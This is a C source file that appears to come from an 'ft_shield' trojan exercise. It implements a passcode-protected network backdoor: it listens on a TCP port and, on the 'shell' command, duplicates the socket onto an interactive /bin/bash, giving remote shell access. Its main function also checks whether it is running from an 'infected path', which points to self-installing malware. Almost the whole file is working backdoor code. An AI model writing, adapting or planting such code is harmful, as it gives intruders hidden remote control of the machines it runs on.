#include "ft_shield.h"

void	ft_shield()
{
	uid_t	uid = geteuid();

	printf("UID: %d\n", uid);
}

int	create_server_socket()
{
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_fd == -1)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}


	int reuse = 1;
	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse, sizeof(reuse)) < 0)
	{
		perror("setsockopt(SO_REUSEADDR)");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in server_addr;

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(LISTENING_PORT);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	if (listen(socket_fd, MAX_CONECTIONS) == -1)
	{
		perror("Listening failed");
		exit(EXIT_FAILURE);
	}
	return (socket_fd);
}

typedef enum e_status {
	HANDSHAKE,
	CONNECTED,
} t_status;

typedef struct s_client {
	int			fd;
	t_status	status;
}	t_client;

void handle_handshake(t_client *client, char *input)
{
	printf("HANDSHAKE INPUT [%s]\n", input);
	if (client->status == HANDSHAKE)
	{
		if (strcmp(PASSCODE, input) != 0) {
			printf("Invalid KEY\n");
			return ;
		}
		printf("Valid KEY\n");
		client->status = CONNECTED;
	}
	send(client->fd, "$> ", 3, 0);
}

int handle_commands(t_client *client, char *input)
{
	int status;

	if (strcmp("clear", input) == 0)
	{
		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
	}
	else if (strcmp("shell", input) == 0)
	{
		send(client->fd, REMOTE_OPENED, sizeof(REMOTE_OPENED), 0);

		pid_t pid = fork();
		if (pid == 0)
		{
			char *args[] = {"/bin/bash", "-i", NULL};
			dup2(client->fd, STDIN_FILENO);
			dup2(client->fd, STDERR_FILENO);
			dup2(client->fd, STDOUT_FILENO);
			close(client->fd);
			execv("/bin/bash", args);
			exit(1);
		}
		waitpid(-1, &status, 0);
	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		send(client->fd, HELP, sizeof(HELP), 0);
	}
	else
	{
		send(client->fd, "$> ", 3, 0);
	}
	return (0);
}

int handle_input(t_client *client, char *buffer)
{
	char	*input = ft_strtrim(buffer, TRIM_CHARS);
	int		fd;

	printf("readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(client, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(client, input);
	free(input);
	return (fd);
}

void init_server()
{
	int server_fd = create_server_socket();

	t_client	clients[100];

	memset(clients, 0, sizeof(clients));
	
	struct sockaddr_in	address;
	int					addrlen = sizeof(address);

	int	clients_nbr = 0;
	int	max_fd = server_fd;

	fd_set		rfds;
	while (1)
	{
		struct timeval tv = {.tv_sec = 10, .tv_usec = 0};
		
		FD_ZERO(&rfds);
		FD_SET(server_fd, &rfds);

		max_fd = server_fd;
		for (int fd = 0; fd < 100; ++fd)
		{
			if (clients[fd].fd)
			{
				FD_SET(clients[fd].fd, &rfds);
				if (clients[fd].fd > max_fd)
					max_fd = clients[fd].fd;
			}
		}

		int retval = select(max_fd + 1, &rfds, NULL, NULL, &tv);
		if (retval == -1)
		{
			perror("select");
		}
		else if (retval != 0)
		{
			if (FD_ISSET(server_fd, &rfds))
			{
				int	client_fd;
				if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)
				{
					perror("accept");
					continue;
				}
				if (clients_nbr == MAX_NBR_CLIENTS)
				{
					printf("Connection denied, to many clients\n");
					close(client_fd);
					continue;
				}
				clients_nbr++;
				clients[client_fd].fd = client_fd;
				printf("New client accepted %d\n", client_fd);
				if (clients[client_fd].status == HANDSHAKE)
					send(client_fd, "Keycode: ", 10, 0);
			}

			for (int fd = 0; fd <= max_fd; ++fd)
			{
				int c_fd = clients[fd].fd;
				if (c_fd && FD_ISSET(c_fd, &rfds))
				{

					char buffer[1024] = {0};

					int ret_read = read(c_fd, buffer, sizeof(buffer) - 1);
					if (ret_read < 0)
					{
						perror("recv");
						continue;
					}
					else if (ret_read == 0)
					{
						printf("Connection closed %d\n", c_fd);
						close(c_fd);
						memset(&clients[fd], 0, sizeof(t_client));
						clients_nbr--;
					}
					else
					{
						handle_input(&clients[fd], buffer);
					}
					if (clients[fd].status == HANDSHAKE)
						send(c_fd, "Keycode: ", 10, 0);
				}
			}
		}
	}
}

int main(int argc, char **argv)
{
	(void)argc,(void)argv;

	char path[255] = {0};

	printf("RET: %d\n", find_own_path(path, sizeof(path)));
	if (strcmp(DEST_PATH, dirname(path)) == 0)
	{
		printf("We are in the infected path: %s\n", path);
	}
	else
	{
		printf("We are safe: %s\n", path);
		init_server();
	}

	return (0);
}
